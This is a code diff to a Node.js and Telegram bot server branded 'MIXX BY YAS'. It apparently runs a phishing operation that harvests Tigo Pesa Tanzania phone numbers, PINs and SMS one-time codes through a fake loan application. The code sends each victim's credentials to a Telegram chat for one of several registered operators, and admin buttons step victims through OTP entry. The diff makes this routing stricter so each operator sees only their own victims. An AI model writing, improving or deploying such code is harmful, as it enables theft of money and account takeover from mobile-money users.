@@ -1,11 +1,5 @@
 /**
- * **MIXX BY YAS - COMPLETE DYNAMIC MULTI-ADMIN BACKEND SERVER**
- * 
- * Features:
- * - Fully automated admin registration (?admin=01, ?admin=02, etc.) via /start.
- * - Persistent JSON mapping storage so new admins work permanently.
- * - Isolated message routing ensuring alerts go exclusively to the correct admin.
- * - Strict Tigo Pesa Tanzania phone verification & complete session workflows.
+ * **MIXX BY YAS - STRICT ISOLATED MULTI-ADMIN BACKEND SERVER**
  */
 
 const express = require('express');
@@ -18,7 +12,6 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || null;
 const APP_URL = process.env.APP_URL || null;
 const USE_WEBHOOK = String(process.env.USE_WEBHOOK || 'false').toLowerCase() === 'true';
 
@@ -31,10 +24,6 @@ const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
 let bot = null; 
 const sessions = new Map();
 
-/**
- * **DYNAMIC ADMIN STORAGE FILE PATH**
- * Automatically tracks and saves all incoming admins.
- */
 const ADMIN_FILE = path.join(__dirname, 'admins.json');
 
 function loadAdminMapping() {
@@ -61,14 +50,16 @@ function saveAdminMapping(mapping) {
 
 let ADMIN_MAPPING = loadAdminMapping();
 
+/**
+ * **STRICT RESOLUTION WITHOUT DEFAULT LEAKS**
+ * Returns null if the admin key does not exist, preventing fallback messages to main admin.
+ */
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return DEFAULT_CHAT_ID;
-  return ADMIN_MAPPING[adminKeyOrId.toLowerCase()] || adminKeyOrId || DEFAULT_CHAT_ID;
+  if (!adminKeyOrId) return null;
+  const lowerKey = String(adminKeyOrId).toLowerCase();
+  return ADMIN_MAPPING[lowerKey] || (Object.values(ADMIN_MAPPING).includes(adminKeyOrId) ? adminKeyOrId : null);
 }
 
-/**
- * **TIGO PESA TANZANIA NUMBER VALIDATOR**
- */
 function isValidTigoNumber(phoneStr) {
   if (!phoneStr) return false;
   const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
@@ -118,9 +109,6 @@ async function initBot() {
   bot.on('polling_error', (err) => console.error('[Bot] polling_error:', err?.message || err));
   bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));
 
-  /**
-   * **AUTOMATIC DYNAMIC /START HANDLER FOR NEW ADMINS**
-   */
   bot.onText(/\/start/, async (msg) => {
     const chatId = String(msg.chat.id);
     const user = msg.from;
@@ -130,11 +118,9 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Check if this chat ID is already registered in mapping
     let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId);
 
     if (!adminCode) {
-      // Automatically generate next sequential professional number (01, 02, 03...)
       const existingKeys = Object.keys(ADMIN_MAPPING).filter(k => !isNaN(k));
       const nextNum = existingKeys.length > 0 ? Math.max(...existingKeys.map(Number)) + 1 : 1;
       adminCode = String(nextNum).padStart(2, '0');
@@ -162,9 +148,6 @@ async function initBot() {
     }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
   });
 
-  /**
-   * **CALLBACK QUERY HANDLER FOR ISOLATED ADMIN BUTTON ACTIONS**
-   */
   bot.on('callback_query', async (query) => {
     try {
       const actionData = query.data || '';
@@ -178,7 +161,12 @@ async function initBot() {
         return;
       }
 
-      const chatTarget = session.adminChatId || DEFAULT_CHAT_ID;
+      const chatTarget = session.adminChatId;
+      if (!chatTarget) {
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Admin destination missing.' });
+        return;
+      }
+
       switch (prefix) {
         case 'ALLOW_OTP':
           session.status = 'APPROVED_LOAD_OTP';
@@ -216,9 +204,6 @@ async function initBot() {
   });
 }
 
-/**
- * **EXPLICIT FRONTEND ROUTES**
- */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app.html'));
 });
@@ -227,9 +212,6 @@ app.get('/secret-admin-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-/**
- * **SUBMIT APPLICATION (PIN ENTRY) - TARGETED EXCLUSIVELY TO CORRECT ADMIN**
- */
 app.post('/api/submit-application', (req, res) => {
   try {
     const { phone, pin, amount, adminChatId } = req.body || {};
@@ -242,6 +224,10 @@ app.post('/api/submit-application', (req, res) => {
     }
 
     const targetChat = resolveAdminChatId(adminChatId);
+    if (!targetChat) {
+      return res.status(400).json({ success: false, error: 'Invalid or unregistered admin identifier.' });
+    }
+
     const userId = phone || `user_${Date.now()}`;
 
     sessions.set(userId, {
@@ -252,10 +238,6 @@ app.post('/api/submit-application', (req, res) => {
       status: 'WAITING_PIN_APPROVAL',
       createdAt: new Date()
     });
-
-    if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'No admin chat ID configured' });
-    }
 
     const message =
       `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
@@ -291,9 +273,6 @@ app.post('/api/submit-application', (req, res) => {
   }
 });
 
-/**
- * **CHECK SESSION STATUS ENDPOINT**
- */
 app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
   const session = sessions.get(userId);
@@ -301,9 +280,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-/**
- * **RECEIVE SMS OTP & PROMPT CORRECT ADMIN**
- */
 app.post('/api/submit-otp', (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -335,8 +311,10 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-    bot.sendMessage(targetChat, message, opts).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, opts).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -344,9 +322,6 @@ app.post('/api/submit-otp', (req, res) => {
   }
 });
 
-/**
- * **REQUEST NEW OTP ENDPOINT**
- */
 app.post('/api/request-new-otp', (req, res) => {
   try {
     const { userId } = req.body || {};
@@ -361,8 +336,10 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -370,7 +347,6 @@ app.post('/api/request-new-otp', (req, res) => {
   }
 });
 
-// Initialize server and bot polling/webhooks
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
